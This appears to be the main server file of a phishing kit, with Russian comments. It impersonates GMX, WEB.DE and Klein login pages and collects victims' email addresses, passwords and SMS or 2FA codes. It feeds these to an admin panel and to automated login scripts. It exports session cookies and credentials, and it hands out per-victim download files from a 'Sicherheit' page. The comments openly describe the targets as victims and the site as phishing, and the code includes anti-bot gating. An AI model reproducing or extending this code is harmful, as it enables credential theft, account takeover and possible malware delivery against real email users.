/**
 * Сервер: приём данных с формы (email/пароль) и отдача списка в админку.
 * WebSocket для мгновенного обновления админки (npm install ws).
 */
const http = require('http');
const https = require('https');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
const { PROJECT_ROOT, DATA_DIR, initAppServices } = require('./core/bootstrap');
const brandDomains = require('./config/brandDomains');
brandDomains.reload();
const { mergeServiceRouteDeps } = require('./core/routeHttpDeps');
const { handleApiRequestChain } = require('./core/httpApiDispatch');
const { handleFastPreGateRoutes, handlePreStaticSpecialRoutes } = require('./core/httpSpecialRoutes');
const { handleDownloadRoutes } = require('./core/httpDownloadRoutes');
const {
  isAdminRequest,
  isAdminPagePath,
  isAdminLoginPath,
  isAdminDomainAllowedPath,
  isAdminDomainPublicUnauthenticatedPath,
  buildAdminLoginNextUrl,
} = require('./core/adminPaths');
const { attachAdminLeadsWebSocket } = require('./services/wsAdminBroadcast');
const url = require('url');
const os = require('os');
const { isLocalHost } = require('./utils/localNetwork');
const {
  resolveLocalDevBrandId,
  applyLocalDevBrandCookies,
  rewriteLocalDevShortcutPath
} = require('./utils/localDevKlein');
const {
  fingerprintSignature,
  collectRequestMeta,
  applyLeadTelemetry,
  deviceSignatureFromRequest
} = require('./lib/leadTelemetry');
const { buildAutomationProfile } = require('./lib/automationProfile');
const { buildLeadLoginContextPayload } = require('./lib/leadLoginContext');
const { scheduleWebdeLayoutHealthcheck } = require('./lib/webdeLayoutHealthScheduler');
const { getWebLoginAndNewPasswordForExport } = require('./lib/leadExportCredentials');
const { logTerminalFlow } = require('./lib/terminalFlowLog');
const {
  getDb,
  closeDb,
  getAllLeads,
  addLead,
  updateLeadPartial,
  replaceLeadRow,
  deepMerge,
  replaceAllLeads,
  getModeData,
  writeModeData,
  DB_PATH,
  clearAllWebdeScriptActiveRuns
} = require('./db/database.js');
const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
const { mailboxSubmitPipelinePrefix } = require('./utils/mailMailboxLogin');
const { ADMIN_DOMAIN, checkAdminAuth, hasValidAdminSession, PASSWORD_AUTH_ENABLED, WORKER_SECRET } = require('./utils/authUtils');
const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
const apiRoutes = require('./routes/apiRoutes');
const clientRoutes = require('./routes/clientRoutes');
const adminRoutes = require('./routes/adminRoutes');
const gateMiddleware = require('./middleware/gateMiddleware');
const staticRoutes = require('./routes/staticRoutes');
const chatService = require('./services/chatService');
const leadService = require('./services/leadService');
const automationService = require('./services/automationService');
const { startAutoBackups } = require('./services/backupService');

const readLeads = () => leadService.readLeads();
const readLeadsAsync = (cb) => leadService.readLeadsAsync(cb);
const invalidateLeadsCache = () => leadService.invalidateLeadsCache();
const resolveLeadId = (id) => leadService.resolveLeadId(id);
const persistLeadPatch = (leadId, patch, opts) => leadService.persistLeadPatch(leadId, patch, opts);
const persistLeadFull = (lead) => leadService.persistLeadFull(lead);
const writeReplacedLeadId = (oldId, newId) => leadService.writeReplacedLeadId(oldId, newId);
const archiveFlagIsSet = leadService.archiveFlagIsSet;
const leadIsWorkedFromEvents = leadService.leadIsWorkedFromEvents;
const leadIsWorkedLikeAdmin = leadService.leadIsWorkedLikeAdmin;

const yauzl = require('yauzl');
const mailService = require('./services/mailService');
const downloadKitService = require('./services/downloadKitService');
let WebSocketServer;
try {
  WebSocketServer = require('ws').WebSocketServer;
} catch (e) {
  WebSocketServer = null;
}
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
} catch (e) {
  HttpsProxyAgent = null;
}

const PORT = parseInt(process.env.PORT, 10) || 3000;
const HOST = (process.env.HOST || '0.0.0.0').trim();

/** Очередь вывода в stdout: при множестве параллельных AUTO-LOGIN снижает пики нагрузки на PM2/терминал. Отключить: SERVER_LOG_DIRECT=1 */
(function initConsoleLogQueue() {
  if (process.env.SERVER_LOG_DIRECT === '1' || String(process.env.SERVER_LOG_DIRECT || '').toLowerCase() === 'true') return;
  const BATCH = Math.max(5, parseInt(process.env.SERVER_LOG_BATCH || '35', 10) || 35);
  const MAX_QUEUE = Math.max(300, parseInt(process.env.SERVER_LOG_MAX_QUEUE || '4000', 10) || 4000);
  const buf = [];
  let scheduled = false;
  const origLog = console.log.bind(console);
  const origErr = console.error.bind(console);
  const origWarn = console.warn.bind(console);
  function flush() {
    scheduled = false;
    let n = 0;
    while (buf.length && n < BATCH) {
      const row = buf.shift();
      n += 1;
      if (row.type === 'err') origErr.apply(console, row.args);
      else if (row.type === 'warn') origWarn.apply(console, row.args);
      else origLog.apply(console, row.args);
    }
    if (buf.length) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  function enqueue(type, argsList) {
    buf.push({ type: type, args: argsList });
    if (buf.length > MAX_QUEUE) {
      const drop = buf.length - Math.floor(MAX_QUEUE * 0.8);
      buf.splice(0, drop);
      origErr('[SERVER] console queue: отброшено ' + drop + ' старых строк (лавина логов)');
    }
    if (!scheduled) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  console.log = function () { enqueue('log', Array.from(arguments)); };
  console.error = function () { enqueue('err', Array.from(arguments)); };
  console.warn = function () { enqueue('warn', Array.from(arguments)); };
})();

/** Прямой вывод в stderr перед синхронным process.exit: очередь console может не успеть сброситься. */
function writeFatalSync(msg) {
  try {
    const s = msg != null && typeof msg !== 'string' ? (msg.stack || String(msg)) : String(msg);
    process.stderr.write(/\n$/.test(s) ? s : s + '\n');
  } catch (_) {}
}

/** Домены GMX / WEB.DE / Klein — brandDomains (env + data/brand-domains.json). */
/** Старые хосты Klein → 301 на KLEIN_CANONICAL_HOST только до KLEIN_LEGACY_REDIRECT_UNTIL (ISO 8601). Пусто = выкл. */
const KLEIN_LEGACY_REDIRECT_HOSTS_RAW = (process.env.KLEIN_LEGACY_REDIRECT_HOSTS || '').trim();
const KLEIN_LEGACY_REDIRECT_HOSTS = KLEIN_LEGACY_REDIRECT_HOSTS_RAW
  ? KLEIN_LEGACY_REDIRECT_HOSTS_RAW.split(',').map(function (d) {
    return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim();
  }).filter(Boolean)
  : [];
const KLEIN_LEGACY_REDIRECT_UNTIL_MS = (function () {
  const raw = (process.env.KLEIN_LEGACY_REDIRECT_UNTIL || '').trim();
  if (!raw) return 0;
  const t = Date.parse(raw);
  return Number.isFinite(t) ? t : 0;
})();

/** @returns {boolean} true если ответ уже отправлен */
function tryKleinLegacyHostRedirect(req, res, requestHost) {
  if (!KLEIN_LEGACY_REDIRECT_UNTIL_MS || !KLEIN_LEGACY_REDIRECT_HOSTS.length) return false;
  if (Date.now() >= KLEIN_LEGACY_REDIRECT_UNTIL_MS) return false;
  const h = String(requestHost || '').split(':')[0].toLowerCase();
  if (KLEIN_LEGACY_REDIRECT_HOSTS.indexOf(h) === -1) return false;
  if (safeEnd(res)) return true;
  let destPath = (req.url || '/').split('#')[0];
  if (!destPath || destPath[0] !== '/') destPath = '/';
  const xfProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
  let httpsOn = xfProto === 'https';
  try {
    if (!httpsOn && req.socket && req.socket.encrypted === true) httpsOn = true;
  } catch (_) {}
  const proto = httpsOn ? 'https' : 'http';
  const loc = proto + '://' + brandDomains.scalars.kleinCanonicalHost + destPath;
  res.writeHead(301, { Location: loc, 'Cache-Control': 'no-store' });
  res.end();
  return true;
}

/** Сообщение под формой Klein после неверного пароля (скрипт автовхода). */
const KLEIN_VICTIM_PASSWORD_ERROR_DE = 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.';

const BRANDS = {
  gmx: {
    id: 'gmx',
    name: 'GMX',
    logoUrl: '/favicon.svg',
    primaryColor: '#1c449b',
    primaryColorDark: '#16367c',
    canonicalUrl: 'https://www.gmx.net/',
    canonicalHost: brandDomains.scalars.gmxCanonicalHost,
    impressumUrl: 'https://www.gmx.net/impressum/',
    datenschutzUrl: 'https://agb-server.gmx.net/datenschutz',
    agbUrl: 'https://agb-server.gmx.net/gmxagb-de',
    hilfeUrl: 'https://hilfe.gmx.net/',
    passwortUrl: 'https://passwort.gmx.net/'
  },
  webde: {
    id: 'webde',
    name: 'WEB.DE',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/de/thumb/5/5f/Web.de_logo.svg/1280px-Web.de_logo.svg.png',
    primaryColor: '#FFDF00',
    primaryColorDark: '#E6C700',
    buttonDisabledColor: '#F5EDC1',
    canonicalUrl: 'https://newsroom.web.de/',
    canonicalHost: brandDomains.scalars.webdeCanonicalHost,
    impressumUrl: 'https://web.de/impressum/',
    datenschutzUrl: 'https://web.de/datenschutz',
    agbUrl: 'https://web.de/agb',
    hilfeUrl: 'https://hilfe.web.de/',
    passwortUrl: 'https://web.de/'
  },
  klein: {
    id: 'klein',
    name: 'Konto',
    logoUrl: '/klein-local-logo.png',
    primaryColor: '#326916',
    primaryColorDark: '#2a5712',
    canonicalUrl: '/',
    canonicalHost: brandDomains.scalars.kleinCanonicalHost,
    impressumUrl: '/anmelden',
    datenschutzUrl: '/anmelden',
    agbUrl: '/anmelden',
    hilfeUrl: '/anmelden',
    passwortUrl: '/anmelden'
  }
};

brandDomains.setBrandsRef(BRANDS);

/** Klein: ссылки и canonical только на текущий хост (без внешних доменов бренда). */
function kleinBrandForRequest(req) {
  const base = BRANDS.klein;
  if (!req || !req.headers || !req.headers.host) return Object.assign({}, base);
  const hostHdr = String(req.headers.host).trim().replace(/\/$/, '');
  const protoHdr = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
  const proto = protoHdr === 'https' ? 'https' : 'http';
  const root = proto + '://' + hostHdr;
  return Object.assign({}, base, {
    canonicalUrl: root + '/',
    impressumUrl: root + '/anmelden',
    datenschutzUrl: root + '/anmelden',
    agbUrl: root + '/anmelden',
    hilfeUrl: root + '/anmelden',
    passwortUrl: root + '/anmelden',
  });
}

/** Бренд по pathname (если все бренды на одном домене). */
function brandIdFromPathname(req) {
  try {
    const rawUrl = (req && typeof req.url === 'string') ? req.url : '';
    const pathname = String(rawUrl.split('?')[0] || '').trim();
    if (pathname === '/klein' || pathname.startsWith('/klein/')) return 'klein';
    if (pathname === '/gmx' || pathname.startsWith('/gmx/')) return 'gmx';
    if (pathname === '/web' || pathname.startsWith('/web/')) return 'webde';
  } catch (_) {}
  return null;
}

/** Определение бренда по хосту: локалка → webde/gmx/klein; Klein-домены → klein (canonical с хоста); WEB.DE → webde, иначе → gmx. */
function getBrand(req) {
  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
  if (isLocalHost(host)) {
    const id = resolveLocalDevBrandId(req);
    if (id === 'klein') return kleinBrandForRequest(req);
    if (id === 'gmx') return BRANDS.gmx;
    return BRANDS.webde;
  }
  const byPath = brandIdFromPathname(req);
  if (byPath === 'klein') return kleinBrandForRequest(req);
  if (byPath === 'gmx') return BRANDS.gmx;
  if (byPath === 'webde') return BRANDS.webde;
  if (brandDomains.KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return kleinBrandForRequest(req);
  if (brandDomains.WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
  return BRANDS.gmx;
}

/** Хост публичной страницы (как у жертвы за прокси): X-Forwarded-Host иначе Host. */
function inboundRequestHost(req) {
  if (!req || !req.headers) return '';
  const xf = req.headers['x-forwarded-host'];
  const raw = (xf && String(xf).split(',')[0].trim()) || String(req.headers.host || '');
  return raw.split(':')[0].toLowerCase();
}

/**
 * Вторая колонка в [ВХОД] терминала: домен фишинг-сайта по фактическому запросу (GMX / WEB.DE / Klein),
 * а не SERVER_LOG_PHISH_LABEL (часто webde-домен), иначе на GMX-домене в логе оставался web-de.one.
 */
function terminalEntradaSiteLabel(req) {
  const host = inboundRequestHost(req);
  const phish = brandDomains.getServerLogPhishLabel();
  if (!host) return phish;
  if (isLocalHost(host)) return phish;
  if (brandDomains.KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.kleinCanonicalHost;
  if (brandDomains.WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.webdeCanonicalHost;
  if (brandDomains.GMX_DOMAINS_LIST.indexOf(host) !== -1) return brandDomains.scalars.gmxCanonicalHost;
  return host.replace(/^www\./, '') || phish;
}

/** Канонический домен для текущего запроса (по бренду хоста). */
function getCanonicalDomain(req) {
  const brand = getBrand(req);
  if (brand.id === 'klein') return brandDomains.scalars.kleinCanonicalHost;
  return brand.canonicalHost;
}

/** Разрешённые домены почты для бренда GMX при /api/submit (если ENABLE_EMAIL_DOMAIN_ALLOWLIST=1). WEB.DE: всегда только @web.de (на localhost — любой). Klein: любой домен. */
const ALLOWED_EMAIL_DOMAINS_RAW = (process.env.ALLOWED_EMAIL_DOMAINS || '').trim();
const ALLOWED_EMAIL_DOMAINS = ALLOWED_EMAIL_DOMAINS_RAW
  ? ALLOWED_EMAIL_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().trim(); }).filter(Boolean)
  : [];
/** Включить фильтр по ALLOWED_EMAIL_DOMAINS для GMX (и прочих не-klein, не-webde). По умолчанию выкл. Env: ENABLE_EMAIL_DOMAIN_ALLOWLIST=1 */
const ENABLE_EMAIL_DOMAIN_ALLOWLIST = /^1|true|yes$/i.test(String(process.env.ENABLE_EMAIL_DOMAIN_ALLOWLIST || '').trim());
/** Требовать cookie гейта для POST /api/submit, /api/klein-anmelden-seen, /api/download-request. По умолчанию выкл (Env: REQUIRE_GATE_COOKIE=1). */
const REQUIRE_GATE_COOKIE = /^1|true|yes$/i.test(String(process.env.REQUIRE_GATE_COOKIE || '').trim());

/** DATA_DIR и PROJECT_ROOT — из core/bootstrap.js (dotenv загружается там). */
const START_PAGE_FILE = path.join(DATA_DIR, 'start-page.txt');
const SHORT_DOMAINS_FILE = path.join(DATA_DIR, 'short-domains.json');
const ZIP_PASSWORD_FILE = path.join(DATA_DIR, 'zip-password.txt');
const ALL_LOG_FILE = path.join(DATA_DIR, 'all.txt');
const DEBUG_LOG_FILE = path.join(DATA_DIR, 'debug.log');
const SAVED_CREDENTIALS_FILE = path.join(DATA_DIR, 'saved-credentials.json');
/** Папка загрузок для страницы /sicherheit. Поддержка 5 файлов (по одному на «человека»), выбор по leadId. */
const DOWNLOADS_DIR = path.join(PROJECT_ROOT, 'downloads');
const DOWNLOAD_FILES_CONFIG = path.join(DATA_DIR, 'download-files.json');
const DOWNLOAD_LIMITS_FILE = path.join(DATA_DIR, 'download-limits.json');
const DOWNLOAD_COUNTS_FILE = path.join(DATA_DIR, 'download-counts.json');
const DOWNLOAD_ANDROID_CONFIG = path.join(DATA_DIR, 'download-android.json');
const DOWNLOAD_ANDROID_LIMITS_FILE = path.join(DATA_DIR, 'download-android-limits.json');
const DOWNLOAD_SETTINGS_FILE = path.join(DATA_DIR, 'download-settings.json');
const DOWNLOAD_ROTATION_FILE = path.join(DATA_DIR, 'download-rotation.json');
/** Список имён файлов куки (safe), которые уже выгружались — для «Выгрузить новые». */
const COOKIES_EXPORTED_FILE = path.join(DATA_DIR, 'cookies-exported.json');
/** Файл прокси на диске: Config → Прокси в админке пишет сюда; lead_simulation_api по умолчанию забирает тот же текст через GET /api/worker/proxy-txt */
const PROXY_FILE = path.join(PROJECT_ROOT, 'login', 'proxy.txt');
/** Прокси только для Klein (браузер ②): Config → Прокси Klein. */
const PROXY_KLEIN_FILE = path.join(PROJECT_ROOT, 'login', 'proxy_klein.txt');
/** Куки Klein (таблица): Config → Куки Klein. */
const KLEIN_COOKIES_FILE = path.join(PROJECT_ROOT, 'login', 'klein_cookies.txt');
const LOGIN_DIR = path.join(PROJECT_ROOT, 'login');
const LOGIN_ARTIFACT_NAMES = ['webde_screenshot.png', 'webde_page_info.txt', 'debug_screenshot.png', 'debug_consent.png', 'lead_data.json', 'lead_result.json'];
const LOGIN_CLEANUP_MAX_AGE_MS = 10 * 60 * 1000; // 10 мин неактивности — удаляем артефакты (оставляем куки и данные лидов)
const short = require('./short');
const DOWNLOAD_SLOTS_COUNT = 5;
const DEFAULT_DOWNLOAD_LIMIT = 5;
/** Временная папка для Check (файл ещё не добавлен в кнопку скачивания) */
const CHECK_DIR = path.join(os.tmpdir(), 'gmw-check');
const CHECK_META_FILE = path.join(CHECK_DIR, 'meta.json');

downloadKitService.init({
  DATA_DIR, PROJECT_ROOT, DOWNLOADS_DIR, DOWNLOAD_SLOTS_COUNT, DEFAULT_DOWNLOAD_LIMIT,
  DOWNLOAD_FILES_CONFIG, DOWNLOAD_LIMITS_FILE, DOWNLOAD_COUNTS_FILE, DOWNLOAD_ANDROID_CONFIG,
  DOWNLOAD_ANDROID_LIMITS_FILE, DOWNLOAD_SETTINGS_FILE, DOWNLOAD_ROTATION_FILE, COOKIES_EXPORTED_FILE,
});
const {
  readDownloadFilesConfig, writeDownloadFilesConfig, readDownloadLimits, writeDownloadLimits,
  readDownloadCounts, writeDownloadCounts, incrementDownloadCount, readCookiesExported, readCookiesExportedSets,
  appendCookiesExportedLeadIds, writeCookiesExported,
  sanitizeFilenameForHeader, slotFromLeadId, readDownloadSettings, writeDownloadSettings,
  readDownloadRotation, writeDownloadRotation, getSlotForLead, getSicherheitDownloadFile,
  getSicherheitDownloadFileByLimit, getSicherheitDownloadFiles, readAndroidDownloadConfig,
  getAndroidDownloadFile, getAndroidDownloadFileByLimit, readAndroidDownloadLimits,
  writeAndroidDownloadLimits, getAndroidDownloadFiles, writeAndroidDownloadConfig, processArchiveToGmx,
} = downloadKitService;

/** kind smsCodeData: 2fa | sms (или эвристика по status/логу) — для скрипта опроса 2FA и согласованности с админкой. */
function smsCodeDataKindForLead(lead) {
  if (!lead || !lead.smsCodeData) return null;
  const code = String(lead.smsCodeData.code || '').trim();
  if (!code) return null;
  const k = lead.smsCodeData.kind;
  if (k === '2fa' || k === 'sms') return k;
  const st = String(lead.status || '').toLowerCase();
  if (st === 'redirect_2fa_code') return '2fa';
  if (st === 'redirect_sms_code' || st === 'redirect_sms') return 'sms';
  const evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
  for (let i = evs.length - 1; i >= 0; i--) {
    const lab = String((evs[i] && evs[i].label) || '').toLowerCase();
    if (lab.indexOf('ввел 2fa-код') === 0) return '2fa';
    if (lab.indexOf('ввел sms kl') === 0 || lab.indexOf('ввел sms-код') === 0 || lab.indexOf('ввел sms:') === 0) return 'sms';
  }
  return 'sms';
}

/** Long-poll «жду новый пароль» для скрипта WEB.DE (по умолчанию 2 мин). Env: WEBDE_WAIT_PASSWORD_TIMEOUT_MS (мс, минимум 60000). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 2 * 60 * 1000;
})();

/** Ошибка автовхода 500/502/503: жертве только оверлей ожидания, без редиректа. Env: WEBDE_SCRIPT_VICTIM_WAIT_MS (мс, мин. 10000). */
const WEBDE_SCRIPT_VICTIM_WAIT_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_VICTIM_WAIT_MS, 10);
  if (Number.isFinite(v) && v >= 10000) return v;
  return 5 * 60 * 1000;
})();

function webdeErrorTriggersVictimAutomationWait(errorCode) {
  const c = String(errorCode || '').trim();
  if (c === '408') return false;
  return c === '500' || c === '502' || c === '503';
}

/** Ожидающие запросы скрипта входа: leadId -> { res, timeoutId }. Админка при сохранении пароля отдаёт пароль в этот запрос. */
const webdePasswordWaiters = {};
/** По leadId: запрос переотправки пуша со страницы админки (скрипт опрашивает и кликает «Mitteilung erneut senden»). */
const webdePushResendRequested = {};

function readCheckMeta() {
  try {
    const data = fs.readFileSync(CHECK_META_FILE, 'utf8');
    return JSON.parse(data);
  } catch (e) { return {}; }
}
function writeCheckMeta(meta) {
  try {
    if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
    fs.writeFileSync(CHECK_META_FILE, JSON.stringify(meta, null, 0));
  } catch (e) {}
}

/** Найти файл в downloads/ по имени (точное или без учёта регистра). Возвращает полный путь или null. */
function findDownloadFile(requestedFileName) {
  if (!requestedFileName || requestedFileName.includes(path.sep) || requestedFileName.includes('..')) return null;
  const full = path.join(DOWNLOADS_DIR, requestedFileName);
  try {
    if (fs.statSync(full).isFile()) return full;
  } catch (e) {}
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR);
    const lower = requestedFileName.toLowerCase();
    for (let i = 0; i < names.length; i++) {
      if (names[i].toLowerCase() === lower) {
        const p = path.join(DOWNLOADS_DIR, names[i]);
        if (fs.statSync(p).isFile()) return p;
        return null;
      }
    }
  } catch (e) {}
  return null;
}

// Пульс сессий только в памяти: /api/status не пишет в файл. При отдаче /api/leads в ответ кладём sessionPulseAt (не трогаем lastSeenAt в JSON — порядок сортировки = только активность лида в файле).
// Считаем пульс свежим не дольше 35 сек — иначе юзер уже мог закрыть вкладку и статус должен стать Offline.
const statusHeartbeats = Object.create(null);
const HEARTBEAT_MAX_AGE_MS = 35 * 1000;
// Доступ для WS-рассылки lead-update: онлайн-статус/страница как в /api/leads.
global.__gmwStatusHeartbeatsForAdmin = statusHeartbeats;

/** Ширина экрана: узкий экран = телефон. Выше порога = планшет или десктоп. */
const MOBILE_MAX_WIDTH = 768;

/**
 * Уточнение платформы по экрану: при узком экране не доверяем десктопному UA (Windows/macOS),
 * чтобы мобильный не отображался как ПК. Планшеты (широкий экран + Android/iOS) оставляем как есть.
 */
function resolvePlatform(uaPlatform, screenWidth) {
  if (uaPlatform == null) return null;
  const w = typeof screenWidth === 'number' && screenWidth >= 0 ? screenWidth : null;
  if (w == null) return uaPlatform;
  const isNarrow = w <= MOBILE_MAX_WIDTH;
  if (isNarrow && (uaPlatform === 'windows' || uaPlatform === 'macos')) return null;
  return uaPlatform;
}

function getClientIp(req) {
  // Cloudflare передаёт реальный IP клиента в CF-Connecting-IP (без него виден только IP edge Cloudflare)
  const cfIp = req.headers['cf-connecting-ip'];
  if (cfIp && typeof cfIp === 'string') {
    const ip = cfIp.trim();
    if (ip) return ip;
  }

  // X-Real-IP (Nginx и др.)
  const realIp = req.headers['x-real-ip'];
  if (realIp && typeof realIp === 'string') {
    const ip = realIp.trim();
    if (ip) return ip;
  }

  // X-Forwarded-For: первый в списке — клиент, дальше прокси (при цепочке прокси брать первый)
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const first = forwarded.split(',')[0];
    if (first && typeof first === 'string') {
      const ip = first.trim();
      if (ip) return ip;
    }
  }

  // Прямое подключение без прокси
  if (req.socket && req.socket.remoteAddress) {
    return req.socket.remoteAddress.replace(/^::ffff:/, '');
  }
  return '0.0.0.0';
}

// --- Защита от ботов: лимиты по IP и минимальное время с момента cookie ---
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 мин
const RATE_LIMITS = {
  visit: { max: 200, window: RATE_LIMIT_WINDOW_MS },
  submit: { max: 300, window: RATE_LIMIT_WINDOW_MS },
  downloadFilename: { max: 150, window: RATE_LIMIT_WINDOW_MS },
  downloadGet: { max: 120, window: RATE_LIMIT_WINDOW_MS },
  configUpload: { max: 30, window: RATE_LIMIT_WINDOW_MS }
};
const rateLimitBuckets = Object.create(null);
const firstGateTimeByIp = Object.create(null);
const GATE_TIME_TTL_MS = 60 * 60 * 1000; // 1 ч
const MIN_TIME_SINCE_GATE_MS = 2000; // 2 сек — быстрые боты отсекаются, юзеры успевают

/** Одноразовые токены для скачивания: без токена в URL боты не могут скачать файл. */
const downloadTokens = Object.create(null);
const DOWNLOAD_TOKEN_TTL_MS = 120 * 1000; // 2 мин
function generateDownloadToken(fileName) {
  const token = require('crypto').randomBytes(24).toString('base64url');
  downloadTokens[token] = { fileName: fileName, expiresAt: Date.now() + DOWNLOAD_TOKEN_TTL_MS };
  return token;
}
function consumeDownloadToken(token) {
  if (!token || typeof token !== 'string') return null;
  const t = downloadTokens[token];
  delete downloadTokens[token];
  if (!t || Date.now() > t.expiresAt) return null;
  return t.fileName;
}

function cleanupRateLimit() {
  const now = Date.now();
  for (const key of Object.keys(rateLimitBuckets)) {
    if (rateLimitBuckets[key].resetAt < now) delete rateLimitBuckets[key];
  }
  for (const ip of Object.keys(firstGateTimeByIp)) {
    if (now - firstGateTimeByIp[ip] > GATE_TIME_TTL_MS) delete firstGateTimeByIp[ip];
  }
  for (const tok of Object.keys(downloadTokens)) {
    if (downloadTokens[tok].expiresAt < now) delete downloadTokens[tok];
  }
}
if (typeof setInterval !== 'undefined') setInterval(cleanupRateLimit, 60000);

function checkRateLimit(ip, bucketKey, limitConfig) {
  const key = bucketKey + ':' + ip;
  const now = Date.now();
  if (!rateLimitBuckets[key] || now > rateLimitBuckets[key].resetAt) {
    rateLimitBuckets[key] = { count: 0, resetAt: now + limitConfig.window };
  }
  rateLimitBuckets[key].count++;
  return rateLimitBuckets[key].count <= limitConfig.max;
}

function setFirstGateTime(ip) {
  if (!firstGateTimeByIp[ip]) firstGateTimeByIp[ip] = Date.now();
}

const MIN_TIME_SINCE_GATE_ANDROID_MS = 800; // для Android — меньше задержка, мобильные быстрее вводят

function getMinTimeSinceGateOk(ip, req) {
  const t = firstGateTimeByIp[ip];
  if (!t) return false;
  const ua = (req && req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
  const isAndroid = /android/.test(ua);
  const minMs = isAndroid ? MIN_TIME_SINCE_GATE_ANDROID_MS : MIN_TIME_SINCE_GATE_MS;
  return (Date.now() - t) >= minMs;
}

/** source: 'user' = действие на странице (юзер), 'admin' = действие из админки (не показываем в красном бейдже).
 *  meta: { session: number } — номер сессии автовхода WEB.DE (колонка «попытка» в логе: поток | N | email).
 *  meta.detail — доп. строка в EVENTS (админка показывает под заголовком). */
function pushEvent(lead, label, source, meta) {
  if (!lead.eventTerminal) lead.eventTerminal = [];
  const ev = { at: new Date().toISOString(), label: label, source: source || 'user' };
  if (meta && typeof meta === 'object') {
    if (meta.session != null && meta.session !== '') {
      const n = parseInt(meta.session, 10);
      ev.session = Number.isFinite(n) ? n : meta.session;
    }
    if (meta.detail != null && String(meta.detail).trim()) {
      ev.detail = String(meta.detail).trim();
    }
  }
  lead.eventTerminal.push(ev);
}

/** Текст для события «Сайт → сервер: submit принят» (и сырой объект в newEvents). */
function submitPipelineDetail(kind, hasPassword, extraDetail, mailEmail) {
  let detail = '';
  const em = mailEmail != null && mailEmail !== '' ? String(mailEmail).trim() : '';
  if (kind === 'klein-flow') {
    detail = 'страница Klein на домене WEB.DE (kleinFlow), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else if (kind === 'klein') {
    detail = 'Klein-страница (домен оператора), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else {
    detail = mailboxSubmitPipelinePrefix(em) + ', ' + (hasPassword ? 'email+пароль' : 'только email');
  }
  if (extraDetail) detail += ' · ' + extraDetail;
  return detail;
}

function submitPipelineEventRaw(atIso, kind, hasPassword, extraDetail, mailEmail) {
  return { at: atIso, label: 'Сайт → сервер: submit принят', source: 'user', detail: submitPipelineDetail(kind, hasPassword, extraDetail, mailEmail) };
}

/** Коротко: что пришло с формы до событий «Ввел почту» / Kl. */
function pushSubmitPipelineEvent(lead, kind, hasPassword, extraDetail) {
  if (!lead) return;
  const em = lead.email != null ? String(lead.email).trim() : '';
  pushEvent(lead, 'Сайт → сервер: submit принят', 'user', { detail: submitPipelineDetail(kind, hasPassword, extraDetail, em) });
}

/** Нормализует историю паролей из старого лога в массив { p, s } (для переноса при слиянии). */
function normalizePasswordHistory(hist) {
  if (!hist) return [];
  if (Array.isArray(hist)) {
    return hist.map(function (entry) {
      if (typeof entry === 'object' && entry && entry.p != null) return { p: String(entry.p).trim(), s: entry.s || 'login' };
      if (typeof entry === 'string' && entry.trim()) return { p: entry.trim(), s: 'login' };
      return null;
    }).filter(Boolean);
  }
  return [];
}

/** Для выгрузки куки: только WEB login + WEB смена пароля (не Klein). */
function getLoginAndNewPassword(lead) {
  return getWebLoginAndNewPasswordForExport(lead);
}

function cookieSafeForLoginCookiesFile(email) {
  if (!email || typeof email !== 'string') return '';
  return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
}

/** Email для legacy login/cookies/*.json и отображения; у Klein логин на KLZ — emailKl. */
function cookieEmailForLeadCookiesFile(lead) {
  if (!lead || typeof lead !== 'object') return '';
  if (lead.brand === 'klein') {
    return String((lead.emailKl || lead.email || '')).trim();
  }
  return String((lead.email || '')).trim();
}

function leadHasSavedCookies(lead) {
  if (lead && lead.cookies != null && String(lead.cookies).trim() !== '') return true;
  const safe = cookieSafeForLoginCookiesFile(cookieEmailForLeadCookiesFile(lead));
  if (!safe) return false;
  try {
    const p = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
    return fs.existsSync(p);
  } catch (e) {
    return false;
  }
}

function leadEventTerminalHasExactLabel(lead, needleLower) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label ? String(ev.label).trim().toLowerCase() : '';
    return lbl === needleLower;
  });
}

/** Имя файла куки по email: только недопустимые в ФС символы заменяем (оставляем @). Итог: ровно почта + .txt */
function cookieExportFilename(email) {
  if (!email || typeof email !== 'string') return 'unknown.txt';
  const base = String(email).replace(/[\x00-\x1f\\/:*?"<>|]/g, '_').trim();
  return (base || 'unknown') + '.txt';
}

